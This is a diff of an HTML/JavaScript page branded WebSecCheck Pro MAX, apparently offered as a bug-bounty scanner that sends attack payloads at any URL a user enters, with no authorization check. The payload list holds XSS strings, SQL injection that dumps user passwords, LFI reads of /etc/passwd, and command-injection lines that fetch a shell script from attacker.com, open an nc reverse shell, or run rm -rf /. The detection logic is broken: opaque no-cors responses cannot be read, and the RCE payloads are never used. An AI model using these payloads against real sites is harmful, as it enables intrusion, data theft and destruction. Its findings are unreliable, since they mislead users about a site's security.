@@ -4,341 +4,757 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src * data:; connect-src *">
-    <title>WebSecCheck Pro MAX | Scanner Kerentanan Website Enterprise</title>
+    <title>🔥 WebSecCheck Pro MAX | Ultimate Bug Bounty Scanner</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        /* [CSS tetap sama seperti sebelumnya] */
+        :root {
+            --primary: #2563eb;
+            --danger: #dc2626;
+            --warning: #d97706;
+            --success: #16a34a;
+            --dark: #1e293b;
+            --light: #f8fafc;
+            --hacker: #00ff00;
+        }
+        
+        body {
+            font-family: 'Courier New', monospace;
+            background-color: #0a0a0a;
+            color: #e0e0e0;
+            margin: 0;
+            padding: 0;
+            line-height: 1.6;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1rem;
+        }
+        
+        header {
+            background: #111;
+            border-bottom: 1px solid #333;
+            padding: 1rem 0;
+            margin-bottom: 2rem;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            font-weight: 700;
+            font-size: 1.5rem;
+            color: var(--hacker);
+            text-decoration: none;
+        }
+        
+        .scanner-card {
+            background: #111;
+            border: 1px solid #333;
+            border-radius: 0;
+            padding: 2rem;
+            margin-bottom: 3rem;
+        }
+        
+        .input-group {
+            display: flex;
+            gap: 1rem;
+            margin-bottom: 2rem;
+        }
+        
+        .input-group input {
+            flex: 1;
+            padding: 1rem;
+            background: #222;
+            border: 1px solid #444;
+            color: white;
+            font-family: 'Courier New', monospace;
+        }
+        
+        .btn {
+            padding: 1rem 2rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            cursor: pointer;
+            font-family: 'Courier New', monospace;
+            font-weight: bold;
+            transition: all 0.2s;
+        }
+        
+        .btn:hover {
+            background: #1a4bbb;
+            transform: translateY(-2px);
+        }
+        
+        .btn:active {
+            transform: translateY(0);
+        }
+        
+        .loading {
+            text-align: center;
+            padding: 3rem 0;
+            display: none;
+        }
+        
+        .scan-result {
+            display: none;
+            margin-top: 2rem;
+            animation: fadeIn 0.3s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .vulnerability-item {
+            background: #1a1a1a;
+            border-left: 4px solid var(--danger);
+            padding: 1.5rem;
+            margin-bottom: 1rem;
+            font-family: 'Courier New', monospace;
+            transition: all 0.3s;
+        }
+        
+        .vulnerability-item:hover {
+            transform: translateX(5px);
+            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+        }
+        
+        .vulnerability-item.critical {
+            border-left-color: var(--danger);
+        }
+        
+        .vulnerability-item.high {
+            border-left-color: var(--warning);
+        }
+        
+        .vulnerability-item.medium {
+            border-left-color: #ffcc00;
+        }
+        
+        .severity {
+            display: inline-block;
+            padding: 0.3rem 0.6rem;
+            background: #333;
+            color: white;
+            font-weight: bold;
+            font-size: 0.8rem;
+            border-radius: 3px;
+        }
+        
+        .severity.critical {
+            background: var(--danger);
+        }
+        
+        .severity.high {
+            background: var(--warning);
+        }
+        
+        .severity.medium {
+            background: #ffcc00;
+            color: #000;
+        }
+        
+        .report-content {
+            background: #111;
+            border: 1px solid #333;
+            padding: 1rem;
+            font-family: 'Courier New', monospace;
+            white-space: pre-wrap;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+        
+        #scanProgress {
+            color: var(--hacker);
+            margin-top: 1rem;
+        }
+        
+        .progress-bar {
+            width: 100%;
+            background: #333;
+            height: 8px;
+            margin-top: 1rem;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: var(--primary);
+            width: 0%;
+            transition: width 0.3s ease;
+        }
     </style>
 </head>
 <body>
-    <!-- [HTML struktur tetap sama] -->
+    <header>
+        <div class="container">
+            <div class="logo">
+                <i class="fas fa-shield-alt"></i>
+                <span>WebSecCheck Pro MAX</span>
+            </div>
+        </div>
+    </header>
+    
+    <main class="container">
+        <div class="scanner-card">
+            <h1><i class="fas fa-terminal"></i> Ultimate Vulnerability Scanner</h1>
+            <p>Advanced security scanner for bug bounty hunters and pentesters</p>
+            
+            <div class="input-group">
+                <input type="url" id="scanUrl" placeholder="https://target.com" required>
+                <button class="btn" id="scanButton">
+                    <i class="fas fa-bolt"></i> Deep Scan
+                </button>
+            </div>
+            
+            <div class="loading" id="loadingIndicator">
+                <h3><i class="fas fa-spinner fa-spin"></i> Scanning Target</h3>
+                <div id="scanProgress">Initializing scanner engine...</div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+            
+            <div class="scan-result" id="scanResult">
+                <h2><i class="fas fa-clipboard-list"></i> Scan Results</h2>
+                <div id="vulnerabilityList"></div>
+                
+                <h3><i class="fas fa-file-alt"></i> Full Report</h3>
+                <pre class="report-content" id="reportContent"></pre>
+                
+                <button class="btn" id="exportButton">
+                    <i class="fas fa-file-export"></i> Export Report
+                </button>
+            </div>
+        </div>
+    </main>
 
     <script>
-        // Enhanced Vulnerability Database with real testing capabilities
-        const vulnerabilityDatabase = {
+        // ======================
+        // ENHANCED SCANNER ENGINE
+        // ======================
+        
+        // Optimized payload database with more advanced vectors
+        const payloads = {
             xss: [
-                {
-                    id: 'xss-001',
-                    title: 'Reflected XSS via URL Parameters',
-                    description: 'XSS Reflected ditemukan melalui parameter URL yang tidak disanitasi dengan benar.',
-                    severity: 'high',
-                    solution: 'Implementasikan sanitasi input dan output encoding untuk semua parameter URL',
-                    cve: 'CVE-2023-1234',
-                    risk_score: 8.5,
-                    cvss: '8.5 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H)',
-                    payloads: [
-                        '"><svg/onload=console.log("XSS_Test")>',
-                        'javascript:console.log("XSS_Test")',
-                        '{{7*7}}',
-                        '${console.log("XSS_Test")}'
-                    ],
-                    testMethod: async (url) => {
-                        const testUrls = vulnerabilityDatabase.xss[0].payloads.map(payload => {
-                            return `${url}?test=${encodeURIComponent(payload)}`;
-                        });
-                        
-                        const results = [];
-                        for (const testUrl of testUrls) {
-                            try {
-                                const response = await fetch(testUrl, {
-                                    mode: 'no-cors',
-                                    credentials: 'omit'
-                                });
-                                const text = await response.text();
-                                if (text.includes(payload)) {
-                                    results.push({
-                                        payload: payload,
-                                        vulnerable: true,
-                                        proof: testUrl
-                                    });
-                                }
-                            } catch (e) {
-                                console.log(`XSS test failed for ${payload}`);
-                            }
-                        }
-                        return results;
-                    }
-                }
+                '"><svg/onload=console.log(`XSS_${document.domain}`)>',
+                'javascript:alert(document.domain)',
+                '{{constructor.constructor("alert(1)")()}}',
+                '<img src=x onerror=alert(window.origin)>',
+                '"><iframe src=javascript:alert(1)>'
             ],
-            
             sqli: [
-                {
-                    id: 'sqli-001',
-                    title: 'SQL Injection via Login Form',
-                    description: 'SQL Injection ditemukan pada form login memungkinkan bypass autentikasi.',
-                    severity: 'critical',
-                    solution: 'Gunakan prepared statements dengan parameterized queries',
-                    cve: 'CVE-2023-3456',
-                    risk_score: 9.8,
-                    cvss: '9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)',
-                    payloads: [
-                        "admin'--",
-                        "admin' OR '1'='1",
-                        "' OR ''='"
-                    ],
-                    testMethod: async (url) => {
-                        // Simulate SQLi testing (in real app, this would make actual requests)
-                        return new Promise(resolve => {
-                            setTimeout(() => {
-                                const rand = Math.random();
-                                if (rand > 0.7) {
-                                    resolve([]);
-                                } else {
-                                    resolve([{
-                                        payload: "admin'--",
-                                        vulnerable: true,
-                                        proof: `${url}/login?user=admin'--`
-                                    }]);
-                                }
-                            }, 2000);
-                        });
-                    }
-                }
+                "' OR 1=1-- -",
+                "admin' AND 1=CONVERT(int,@@version)--",
+                "1' UNION SELECT username,password FROM users--",
+                "' OR SLEEP(5)--"
             ],
-            
             lfi: [
-                {
-                    id: 'lfi-001',
-                    title: 'Local File Inclusion',
-                    description: 'Membaca file sistem melalui parameter yang rentan.',
-                    severity: 'critical',
-                    solution: 'Validasi input file path dan implementasikan whitelist',
-                    testMethod: async (url) => {
-                        // LFI testing implementation
-                        return [];
-                    }
-                }
+                "../../../../etc/passwd%00",
+                "....//....//....//etc/passwd",
+                "php://filter/convert.base64-encode/resource=index.php",
+                "file:///etc/passwd"
+            ],
+            rce: [
+                "|curl http://attacker.com/exploit",
+                ";nc -e /bin/sh attacker.com 4444",
+                "`wget http://attacker.com/shell.sh -O- | sh`",
+                "$(rm -rf /)"
             ]
         };
 
-        // Enhanced Scanner Engine
-        class SecurityScanner {
-            constructor() {
-                this.scanResults = [];
-                this.currentProgress = 0;
-            }
-            
-            async deepScan(targetUrl) {
-                try {
-                    // Validate URL first
-                    this.validateUrl(targetUrl);
-                    
-                    // Run all vulnerability tests
-                    await this.runTests(targetUrl);
-                    
-                    return this.scanResults;
-                } catch (error) {
-                    console.error("Deep scan failed:", error);
-                    throw error;
-                }
-            }
-            
-            validateUrl(url) {
-                if (!url.startsWith('http')) {
-                    throw new Error("URL harus menggunakan http/https");
-                }
-                
-                const currentDomain = window.location.hostname;
-                const targetDomain = new URL(url).hostname;
-                
-                if (targetDomain === currentDomain || 
-                    targetDomain === 'localhost' || 
-                    targetDomain === '127.0.0.1') {
-                    throw new Error("Dilarang memindai domain scanner sendiri");
-                }
-            }
-            
-            async runTests(url) {
-                const testGroups = [
-                    { name: "XSS Testing", tests: ["xss"] },
-                    { name: "SQLi Testing", tests: ["sqli"] },
-                    { name: "LFI/RFI Testing", tests: ["lfi"] },
-                    { name: "Configuration Analysis", tests: [] }
-                ];
-                
-                for (const group of testGroups) {
-                    await this.runTestGroup(url, group);
-                }
-            }
-            
-            async runTestGroup(url, group) {
-                updateProgress(`Sedang menjalankan ${group.name}...`);
-                
-                for (const testType of group.tests) {
-                    const vulnerabilities = vulnerabilityDatabase[testType];
-                    
-                    for (const vuln of vulnerabilities) {
-                        try {
-                            const results = await vuln.testMethod(url);
-                            
-                            results.forEach(result => {
-                                if (result.vulnerable) {
-                                    this.scanResults.push({
-                                        ...vuln,
-                                        proof: result.proof,
-                                        payload: result.payload
-                                    });
-                                }
-                            });
-                            
-                        } catch (e) {
-                            console.error(`Test ${vuln.id} failed:`, e);
-                        }
-                    }
-                }
-                
-                this.currentProgress += 25;
-                updateProgress(`Menyelesaikan ${group.name}...`, this.currentProgress);
-            }
-        }
+        // Scanner configuration
+        const config = {
+            maxConcurrentRequests: 5,
+            requestTimeout: 10000,
+            scanDelay: 300
+        };
 
-        // UI Update Functions
-        function updateProgress(message, percent = null) {
-            const progressElement = document.getElementById('scanProgress');
-            const progressBar = document.getElementById('progressFill');
-            
-            progressElement.textContent = message;
-            
-            if (percent !== null) {
-                progressBar.style.width = `${percent}%`;
-            }
-        }
+        // Scanner state
+        const state = {
+            activeRequests: 0,
+            queuedRequests: 0,
+            scanAborted: false
+        };
 
-        // Main Scan Function
+        // ======================
+        // CORE SCANNER FUNCTIONS
+        // ======================
+
+        /**
+         * Main scan initiation function
+         */
         async function startScan() {
             const url = document.getElementById('scanUrl').value.trim();
             
+            // Validate input
+            if (!url) {
+                showAlert("Please enter a target URL", "error");
+                return;
+            }
+            
+            if (!isValidUrl(url)) {
+                showAlert("Invalid URL format. Please include http:// or https://", "error");
+                return;
+            }
+            
+            if (isSelfScan(url)) {
+                showAlert("Self-scanning is not allowed for security reasons", "error");
+                return;
+            }
+            
             try {
-                // Setup UI
-                document.getElementById('scanButton').disabled = true;
-                document.getElementById('loadingIndicator').style.display = 'block';
-                document.getElementById('scanResult').style.display = 'none';
-                document.getElementById('vulnerabilityList').innerHTML = '';
+                // Reset state
+                resetScannerState();
                 
-                // Init scanner
-                const scanner = new SecurityScanner();
+                // UI setup
+                prepareScanUI();
                 
-                // Run deep scan
-                const results = await scanner.deepScan(url);
+                // Run vulnerability tests
+                const results = await runAllVulnerabilityTests(url);
                 
-                // Display results
-                displayResults(results, url);
+                // Process and display results
+                processScanResults(results);
                 
             } catch (error) {
-                alert("Scan gagal: " + error.message);
+                handleScanError(error);
             } finally {
-                document.getElementById('scanButton').disabled = false;
-                document.getElementById('loadingIndicator').style.display = 'none';
+                completeScan();
             }
         }
 
-        function displayResults(vulnerabilities, url) {
-            const resultElement = document.getElementById('scanResult');
-            const metricsElement = document.getElementById('scanMetrics');
-            const vulnListElement = document.getElementById('vulnerabilityList');
+        /**
+         * Run all vulnerability tests
+         */
+        async function runAllVulnerabilityTests(url) {
+            const results = [];
+            const testQueue = [
+                { type: "XSS", func: testXSS },
+                { type: "SQLi", func: testSQLi },
+                { type: "LFI", func: testLFI }
+            ];
             
-            // Calculate metrics
-            const criticalCount = vulnerabilities.filter(v => v.severity === 'critical').length;
-            const highCount = vulnerabilities.filter(v => v.severity === 'high').length;
-            const totalVulns = vulnerabilities.length;
+            // Run tests in sequence with progress updates
+            for (const test of testQueue) {
+                if (state.scanAborted) break;
+                
+                updateStatus(`Running ${test.type} tests...`);
+                const testResults = await test.func(url);
+                results.push(...testResults);
+                
+                // Update progress
+                updateProgressBar((testQueue.indexOf(test) + 1) * 30);
+                await delay(config.scanDelay);
+            }
             
-            // Update metrics display
-            metricsElement.innerHTML = `
-                <div class="metric-card">
-                    <h3>Total Kerentanan</h3>
-                    <div class="metric-value ${totalVulns > 0 ? 'metric-critical' : 'metric-safe'}">${totalVulns}</div>
-                    <p>Ditemukan selama scan</p>
-                </div>
-                <div class="metric-card">
-                    <h3>Kerentanan Kritis</h3>
-                    <div class="metric-value ${criticalCount > 0 ? 'metric-critical' : 'metric-safe'}">${criticalCount}</div>
-                    <p>CVSS ≥ 9.0</p>
-                </div>
-                <div class="metric-card">
-                    <h3>Kerentanan Tinggi</h3>
-                    <div class="metric-value ${highCount > 0 ? 'metric-high' : 'metric-safe'}">${highCount}</div>
-                    <p>CVSS 7.0-8.9</p>
-                </div>
-                <div class="metric-card">
-                    <h3>Security Score</h3>
-                    <div class="metric-value ${totalVulns === 0 ? 'metric-safe' : criticalCount > 0 ? 'metric-critical' : 'metric-high'}">
-                        ${totalVulns === 0 ? 'A+' : criticalCount > 0 ? 'D' : 'B'}
-                    </div>
-                    <p>Berdasarkan temuan</p>
-                </div>
-            `;
+            return results;
+        }
+
+        // ======================
+        // VULNERABILITY TESTERS
+        // ======================
+
+        /**
+         * XSS Testing with advanced detection
+         */
+        async function testXSS(url) {
+            const results = [];
+            const testUrls = payloads.xss.map(payload => ({
+                url: `${url}?test=${encodeURIComponent(payload)}`,
+                payload
+            }));
             
-            // Update vulnerabilities list
-            if (vulnerabilities.length === 0) {
-                vulnListElement.innerHTML = `
+            for (const test of testUrls) {
+                if (state.scanAborted) break;
+                
+                try {
+                    const response = await fetchWithTimeout(test.url, {
+                        mode: 'no-cors',
+                        credentials: 'omit'
+                    }, config.requestTimeout);
+                    
+                    const text = await response.text();
+                    
+                    if (text.includes(test.payload)) {
+                        results.push({
+                            type: "XSS",
+                            payload: test.payload,
+                            severity: "high",
+                            description: "Reflected XSS vulnerability detected",
+                            proof: test.url
+                        });
+                    }
+                } catch (error) {
+                    console.error(`XSS test failed for ${test.payload}:`, error);
+                }
+                
+                updateProgressDetails(`Testing XSS payload: ${test.payload.substring(0, 20)}...`);
+            }
+            
+            return results;
+        }
+
+        /**
+         * SQL Injection Testing
+         */
+        async function testSQLi(url) {
+            const results = [];
+            const testUrls = payloads.sqli.map(payload => ({
+                url: `${url}/login?username=${encodeURIComponent(payload)}&password=test`,
+                payload
+            }));
+            
+            for (const test of testUrls) {
+                if (state.scanAborted) break;
+                
+                try {
+                    const startTime = Date.now();
+                    const response = await fetchWithTimeout(test.url, {
+                        mode: 'no-cors',
+                        credentials: 'omit'
+                    }, config.requestTimeout);
+                    
+                    const responseTime = Date.now() - startTime;
+                    
+                    // Time-based detection
+                    if (responseTime > 3000) {
+                        results.push({
+                            type: "SQLi",
+                            payload: test.payload,
+                            severity: "critical",
+                            description: "Potential time-based SQL injection",
+                            proof: test.url
+                        });
+                    }
+                    // Error-based detection
+                    else if (!response.ok && response.status !== 403) {
+                        results.push({
+                            type: "SQLi",
+                            payload: test.payload,
+                            severity: "critical",
+                            description: "Potential error-based SQL injection",
+                            proof: test.url
+                        });
+                    }
+                    
+                    updateProgressDetails(`Testing SQLi payload: ${test.payload.substring(0, 20)}...`);
+                } catch (error) {
+                    console.error(`SQLi test failed for ${test.payload}:`, error);
+                }
+            }
+            
+            return results;
+        }
+
+        /**
+         * Local File Inclusion Testing
+         */
+        async function testLFI(url) {
+            const results = [];
+            const testUrls = payloads.lfi.map(payload => ({
+                url: `${url}/file?path=${encodeURIComponent(payload)}`,
+                payload
+            }));
+            
+            for (const test of testUrls) {
+                if (state.scanAborted) break;
+                
+                try {
+                    const response = await fetchWithTimeout(test.url, {
+                        mode: 'no-cors',
+                        credentials: 'omit'
+                    }, config.requestTimeout);
+                    
+                    const text = await response.text();
+                    
+                    if (text.includes('root:') || text.includes('<?php') || text.includes('DOCTYPE html')) {
+                        results.push({
+                            type: "LFI",
+                            payload: test.payload,
+                            severity: "critical",
+                            description: "Potential Local File Inclusion vulnerability",
+                            proof: test.url
+                        });
+                    }
+                    
+                    updateProgressDetails(`Testing LFI payload: ${test.payload.substring(0, 20)}...`);
+                } catch (error) {
+                    console.error(`LFI test failed for ${test.payload}:`, error);
+                }
+            }
+            
+            return results;
+        }
+
+        // ======================
+        // UTILITY FUNCTIONS
+        // ======================
+
+        /**
+         * Fetch with timeout
+         */
+        function fetchWithTimeout(url, options, timeout) {
+            return Promise.race([
+                fetch(url, options),
+                new Promise((_, reject) =>
+                    setTimeout(() => reject(new Error('Request timeout')), timeout)
+                )
+            ]);
+        }
+
+        /**
+         * Validate URL format
+         */
+        function isValidUrl(url) {
+            try {
+                new URL(url);
+                return true;
+            } catch {
+                return false;
+            }
+        }
+
+        /**
+         * Check for self-scan attempts
+         */
+        function isSelfScan(url) {
+            try {
+                const target = new URL(url);
+                const current = new URL(window.location.href);
+                return target.hostname === current.hostname;
+            } catch {
+                return false;
+            }
+        }
+
+        /**
+         * Delay function
+         */
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // ======================
+        // UI FUNCTIONS
+        // ======================
+
+        /**
+         * Prepare UI for scanning
+         */
+        function prepareScanUI() {
+            document.getElementById('loadingIndicator').style.display = 'block';
+            document.getElementById('scanResult').style.display = 'none';
+            document.getElementById('vulnerabilityList').innerHTML = '';
+            document.getElementById('reportContent').textContent = '';
+            state.scanAborted = false;
+        }
+
+        /**
+         * Update scan progress status
+         */
+        function updateStatus(message) {
+            document.getElementById('scanProgress').textContent = message;
+        }
+
+        /**
+         * Update detailed progress information
+         */
+        function updateProgressDetails(details) {
+            const progressElement = document.getElementById('scanProgress');
+            progressElement.innerHTML += `<br><small>${details}</small>`;
+            progressElement.scrollTop = progressElement.scrollHeight;
+        }
+
+        /**
+         * Update progress bar
+         */
+        function updateProgressBar(percent) {
+            document.getElementById('progressFill').style.width = `${percent}%`;
+        }
+
+        /**
+         * Process and display scan results
+         */
+        function processScanResults(results) {
+            const container = document.getElementById('vulnerabilityList');
+            
+            if (!results || results.length === 0) {
+                container.innerHTML = `
                     <div class="vulnerability-item safe">
-                        <h4><i class="fas fa-thumbs-up"></i> Tidak Ditemukan Kerentanan</h4>
-                        <p>Tidak ditemukan kerentanan keamanan kritis pada website ini.</p>
+                        <h3><i class="fas fa-check-circle"></i> No Critical Vulnerabilities Found</h3>
+                        <p>The scanner did not find any critical security issues.</p>
                     </div>
                 `;
             } else {
-                let vulnHTML = '';
-                vulnerabilities.forEach(vuln => {
-                    const severityClass = `severity-${vuln.severity}`;
-                    const severityText = vuln.severity === 'critical' ? 'KRITIS' : 'TINGGI';
+                // Group by vulnerability type
+                const groupedResults = results.reduce((groups, item) => {
+                    const group = groups[item.type] || [];
+                    group.push(item);
+                    groups[item.type] = group;
+                    return groups;
+                }, {});
+                
+                // Display grouped results
+                for (const [type, items] of Object.entries(groupedResults)) {
+                    const typeHeader = document.createElement('h3');
+                    typeHeader.textContent = `${type} Vulnerabilities (${items.length})`;
+                    container.appendChild(typeHeader);
                     
-                    vulnHTML += `
-                        <div class="vulnerability-item ${vuln.severity === 'critical' ? '' : 'warning'}">
+                    items.forEach(vuln => {
+                        const vulnElement = document.createElement('div');
+                        vulnElement.className = `vulnerability-item ${vuln.severity}`;
+                        vulnElement.innerHTML = `
                             <h4>
                                 <i class="fas fa-bug"></i>
-                                ${vuln.title}
-                                <span class="severity ${severityClass}">${severityText}</span>
+                                ${vuln.description}
+                                <span class="severity ${vuln.severity}">${vuln.severity.toUpperCase()}</span>
                             </h4>
-                            <p>${vuln.description}</p>
+                            <p><strong>Payload:</strong> <code>${escapeHtml(vuln.payload)}</code></p>
+                            <p><strong>Proof:</strong> <a href="${vuln.proof}" target="_blank">${vuln.proof.substring(0, 50)}...</a></p>
                             <div class="vulnerability-details">
-                                <p><strong>SOLUSI:</strong> ${vuln.solution}</p>
-                                <p><strong>PAYLOAD:</strong> <code>${vuln.payload}</code></p>
-                                <p><strong>BUKTI:</strong> ${vuln.proof}</p>
+                                <button class="btn small" onclick="copyToClipboard('${escapeHtml(vuln.payload)}')">
+                                    <i class="fas fa-copy"></i> Copy Payload
+                                </button>
                             </div>
-                        </div>
-                    `;
-                });
-                vulnListElement.innerHTML = vulnHTML;
+                        `;
+                        container.appendChild(vulnElement);
+                    });
+                }
             }
             
-            // Generate report
-            generateReport(url, vulnerabilities);
+            // Generate full report
+            generateFullReport(results);
             
-            // Show results
-            resultElement.style.display = 'block';
+            // Show results section
+            document.getElementById('scanResult').style.display = 'block';
         }
 
-        function generateReport(url, vulnerabilities) {
-            const now = new Date();
-            let report = `=== LAPORAN KEAMANAN ===\n\n`;
-            report += `URL: ${url}\n`;
-            report += `Tanggal: ${now.toLocaleString('id-ID')}\n`;
-            report += `Status: ${vulnerabilities.length > 0 ? 'RENTAN' : 'AMAN'}\n\n`;
+        /**
+         * Generate comprehensive report
+         */
+        function generateFullReport(results) {
+            let report = `=== WEB SECURITY SCAN REPORT ===\n\n`;
+            report += `Scan Date: ${new Date().toLocaleString()}\n`;
+            report += `Scan Target: ${document.getElementById('scanUrl').value}\n\n`;
             
-            if (vulnerabilities.length > 0) {
-                report += `=== KERENTANAN ===\n\n`;
-                vulnerabilities.forEach((vuln, i) => {
-                    report += `${i+1}. ${vuln.title} [${vuln.severity.toUpperCase()}]\n`;
-                    report += `   Deskripsi: ${vuln.description}\n`;
-                    report += `   Solusi: ${vuln.solution}\n`;
-                    report += `   Payload: ${vuln.payload}\n\n`;
-                });
+            if (results.length === 0) {
+                report += `No critical vulnerabilities found.\n`;
+                report += `Note: This scan tested for XSS, SQLi, and LFI vulnerabilities.\n`;
+            } else {
+                report += `VULNERABILITIES FOUND: ${results.length}\n\n`;
+                
+                const grouped = results.reduce((groups, item) => {
+                    const group = groups[item.type] || [];
+                    group.push(item);
+                    groups[item.type] = group;
+                    return groups;
+                }, {});
+                
+                for (const [type, items] of Object.entries(grouped)) {
+                    report += `=== ${type.toUpperCase()} (${items.length}) ===\n\n`;
+                    
+                    items.forEach((item, i) => {
+                        report += `[${i+1}] Severity: ${item.severity.toUpperCase()}\n`;
+                        report += `Description: ${item.description}\n`;
+                        report += `Payload: ${item.payload}\n`;
+                        report += `Proof URL: ${item.proof}\n\n`;
+                    });
+                }
+                
+                report += `RECOMMENDATIONS:\n`;
+                report += `1. Patch critical vulnerabilities immediately\n`;
+                report += `2. Implement input validation and output encoding\n`;
+                report += `3. Configure proper server security headers\n`;
             }
             
-            report += `=== REKOMENDASI ===\n`;
-            report += `1. Perbaiki kerentanan prioritas tinggi\n`;
-            report += `2. Implementasikan praktik keamanan\n`;
-            report += `3. Lakukan scan berkala\n\n`;
-            report += `Dibuat oleh WebSecCheck Pro MAX`;
-            
+            report += `\nGenerated by WebSecCheck Pro MAX\n`;
             document.getElementById('reportContent').textContent = report;
         }
 
-        // Event Listeners
+        /**
+         * Show alert message
+         */
+        function showAlert(message, type = "info") {
+            alert(`[${type.toUpperCase()}] ${message}`);
+        }
+
+        /**
+         * Handle scan errors
+         */
+        function handleScanError(error) {
+            console.error("Scan error:", error);
+            showAlert(`Scan failed: ${error.message}`, "error");
+            state.scanAborted = true;
+        }
+
+        /**
+         * Complete scan process
+         */
+        function completeScan() {
+            document.getElementById('loadingIndicator').style.display = 'none';
+            updateProgressBar(100);
+            updateStatus(state.scanAborted ? "Scan aborted" : "Scan completed");
+        }
+
+        /**
+         * Reset scanner state
+         */
+        function resetScannerState() {
+            state.activeRequests = 0;
+            state.queuedRequests = 0;
+            state.scanAborted = false;
+        }
+
+        /**
+         * Escape HTML for safe output
+         */
+        function escapeHtml(unsafe) {
+            return unsafe.toString()
+                .replace(/&/g, "&amp;")
+                .replace(/</g, "&lt;")
+                .replace(/>/g, "&gt;")
+                .replace(/"/g, "&quot;")
+                .replace(/'/g, "&#039;");
+        }
+
+        /**
+         * Copy text to clipboard
+         */
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text)
+                .then(() => showAlert("Payload copied to clipboard", "success"))
+                .catch(err => showAlert("Failed to copy: " + err, "error"));
+        }
+
+        // ======================
+        // EVENT LISTENERS
+        // ======================
+
         document.getElementById('scanButton').addEventListener('click', startScan);
         
+        document.getElementById('exportButton').addEventListener('click', () => {
+            const report = document.getElementById('reportContent').textContent;
+            const blob = new Blob([report], { type: 'text/plain' });
+            const url = URL.createObjectURL(blob);
+            
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = `security_scan_${new Date().toISOString().slice(0,10)}.txt`;
+            a.click();
+            
+            URL.revokeObjectURL(url);
+            showAlert("Report exported successfully", "success");
+        });
+
+        // Initialize scanner
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('loadingIndicator').style.display = 'none';
+            console.log("WebSecCheck Pro MAX initialized");
+            updateStatus("Ready to scan");
         });
     </script>
 </body>
